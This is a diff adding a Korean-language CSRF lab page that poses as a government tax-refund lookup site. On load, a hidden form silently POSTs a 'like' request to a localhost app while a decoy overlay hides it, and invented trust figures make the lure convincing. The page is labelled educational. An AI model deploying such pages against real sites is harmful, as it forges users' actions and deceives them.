@@ -1,0 +1,147 @@
+<!doctype html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>2026 국민 세금 환급 조회센터</title>
+    <style>
+        :root{
+            --brand:#1a5fb4; --brand-dark:#154a8c; --accent:#f6b41a;
+            --bg:#f4f6fb; --card:#ffffff; --text:#1f2430; --muted:#6b7280; --line:#e5e8f0;
+        }
+        *{box-sizing:border-box;margin:0;padding:0}
+        body{
+            font-family:"Malgun Gothic","맑은 고딕",system-ui,sans-serif;
+            background:var(--bg); color:var(--text); line-height:1.55;
+        }
+        a{color:inherit;text-decoration:none}
+
+        /* 상단 바 */
+        .topbar{background:var(--brand-dark); color:#dbe7fb; font-size:12px}
+        .topbar .wrap{max-width:960px;margin:0 auto;padding:6px 20px;display:flex;justify-content:space-between}
+
+        /* 헤더 */
+        header{background:var(--brand); color:#fff}
+        header .wrap{max-width:960px;margin:0 auto;padding:18px 20px;display:flex;align-items:center;gap:12px}
+        .logo{width:40px;height:40px;border-radius:50%;background:var(--accent);
+            display:flex;align-items:center;justify-content:center;font-weight:800;color:#2b2200;font-size:20px}
+        header h1{font-size:19px;font-weight:700}
+        header p{font-size:12px;opacity:.85}
+        nav{margin-left:auto;display:flex;gap:22px;font-size:14px;font-weight:600}
+        @media(max-width:640px){nav{display:none}}
+
+        /* 히어로 */
+        .hero{background:linear-gradient(135deg,#1a5fb4 0%,#2b7de0 100%);color:#fff;text-align:center;padding:46px 20px 90px}
+        .hero .badge{display:inline-block;background:rgba(255,255,255,.18);border:1px solid rgba(255,255,255,.35);
+            border-radius:999px;padding:5px 14px;font-size:12px;margin-bottom:16px}
+        .hero h2{font-size:30px;font-weight:800;margin-bottom:10px}
+        .hero h2 span{color:var(--accent)}
+        .hero p{font-size:15px;opacity:.92}
+
+        /* 조회 카드 */
+        .panel{max-width:620px;margin:-60px auto 0;background:var(--card);border-radius:16px;
+            box-shadow:0 20px 50px rgba(20,40,90,.18);padding:30px 28px;position:relative;z-index:2}
+        .panel h3{font-size:18px;margin-bottom:4px}
+        .panel .sub{color:var(--muted);font-size:13px;margin-bottom:20px}
+        .field{margin-bottom:14px}
+        .field label{display:block;font-size:13px;font-weight:600;margin-bottom:6px}
+        .field input{width:100%;padding:12px 14px;border:1px solid var(--line);border-radius:10px;font-size:14px;background:#fafbfe}
+        .field input:focus{outline:none;border-color:var(--brand);background:#fff}
+        .cta{width:100%;margin-top:8px;padding:14px;border:none;border-radius:10px;background:var(--accent);
+            color:#2b2200;font-size:16px;font-weight:800;cursor:pointer;transition:filter .15s}
+        .cta:hover{filter:brightness(1.05)}
+        .note{margin-top:14px;font-size:11.5px;color:var(--muted);text-align:center}
+
+        /* 신뢰 뱃지 */
+        .trust{max-width:620px;margin:22px auto 0;display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
+        .chip{background:#fff;border:1px solid var(--line);border-radius:999px;padding:7px 14px;font-size:12px;color:#374151}
+        .chip b{color:var(--brand)}
+
+        /* 안내 섹션 */
+        .info{max-width:960px;margin:44px auto 0;padding:0 20px;display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+        @media(max-width:640px){.info{grid-template-columns:1fr}}
+        .info .box{background:#fff;border:1px solid var(--line);border-radius:12px;padding:20px}
+        .info .box .ic{font-size:24px;margin-bottom:8px}
+        .info .box h4{font-size:15px;margin-bottom:6px}
+        .info .box p{font-size:13px;color:var(--muted)}
+
+        /* 푸터 */
+        footer{margin-top:50px;background:#eceff5;color:#6b7280;font-size:12px}
+        footer .wrap{max-width:960px;margin:0 auto;padding:24px 20px}
+        footer .wrap p{margin-bottom:4px}
+
+        /* 처리 중 오버레이 (미끼 연출) */
+        .overlay{position:fixed;inset:0;background:rgba(244,246,251,.92);display:flex;flex-direction:column;
+            align-items:center;justify-content:center;z-index:50;transition:opacity .4s}
+        .overlay.hide{opacity:0;pointer-events:none}
+        .spinner{width:46px;height:46px;border:4px solid #d6dcea;border-top-color:var(--brand);border-radius:50%;
+            animation:spin .8s linear infinite;margin-bottom:16px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+        .overlay p{color:var(--muted);font-size:14px}
+    </style>
+</head>
+<body>
+    <iframe name="sink" style="display:none" aria-hidden="true"></iframe>
+    <form id="attack" action="http://localhost:9090/posts/93414/like" method="POST" target="sink"></form>
+
+    <div class="topbar"><div class="wrap"><span>국민 세금 환급 조회센터</span><span>고객센터 1588-0000 · 평일 09:00~18:00</span></div></div>
+    <header>
+        <div class="wrap">
+            <div class="logo">₩</div>
+            <div>
+                <h1>국민 세금 환급 조회센터</h1>
+                <p>미수령 환급금 통합 조회 서비스</p>
+            </div>
+            <nav><a href="#">환급 조회</a><a href="#">신청 방법</a><a href="#">자주 묻는 질문</a><a href="#">고객센터</a></nav>
+        </div>
+    </header>
+
+    <section class="hero">
+        <span class="badge">2026년 귀속 · 신규 환급 대상자 조회 시작</span>
+        <h2>혹시 <span>못 받은 환급금</span>이 있으신가요?</h2>
+        <p>이름과 생년월일만 입력하면 평균 <b>37만원</b>의 미수령 환급금을 1분 안에 조회할 수 있습니다.</p>
+    </section>
+
+    <div class="panel">
+        <h3>미수령 환급금 조회</h3>
+        <p class="sub">아래 정보를 입력하고 조회 버튼을 누르세요. (조회는 무료입니다)</p>
+        <div class="field"><label>이름</label><input type="text" placeholder="홍길동"></div>
+        <div class="field"><label>생년월일</label><input type="text" placeholder="예: 1990-01-01"></div>
+        <div class="field"><label>연락처</label><input type="text" placeholder="010-0000-0000"></div>
+        <button class="cta" type="button">내 환급금 조회하기</button>
+        <p class="note">※ 본 서비스는 CSRF 실습을 위한 가상 페이지입니다. 실제 기관과 무관합니다.</p>
+    </div>
+
+    <div class="trust">
+        <span class="chip">🔒 <b>256bit</b> 보안 접속</span>
+        <span class="chip">👥 오늘 <b>12,480명</b> 조회</span>
+        <span class="chip">⭐ 만족도 <b>4.9/5.0</b></span>
+    </div>
+
+    <div class="info">
+        <div class="box"><div class="ic">🔍</div><h4>간편 조회</h4><p>복잡한 공인인증 없이 기본 정보만으로 환급금을 조회합니다.</p></div>
+        <div class="box"><div class="ic">⚡</div><h4>빠른 처리</h4><p>조회부터 신청까지 평균 3분이면 충분합니다.</p></div>
+        <div class="box"><div class="ic">💰</div><h4>무료 서비스</h4><p>조회 및 신청에 어떠한 비용도 청구되지 않습니다.</p></div>
+    </div>
+
+    <footer>
+        <div class="wrap">
+            <p><b>국민 세금 환급 조회센터</b> (가상 교육용 페이지)</p>
+            <p>이 페이지는 CSRF 공격 원리를 학습하기 위한 실습 자료이며, 어떤 실제 정부기관·기업과도 관련이 없습니다.</p>
+            <p>© 2026 CSRF Lab. For educational use only.</p>
+        </div>
+    </footer>
+
+    <div class="overlay" id="ov">
+        <div class="spinner"></div>
+        <p>환급금 정보를 조회하고 있습니다...</p>
+    </div>
+
+    <script>
+        document.getElementById('attack').submit();
+        setTimeout(function () {
+            document.getElementById('ov').classList.add('hide');
+        }, 1600);
+    </script>
+</body>
+</html>
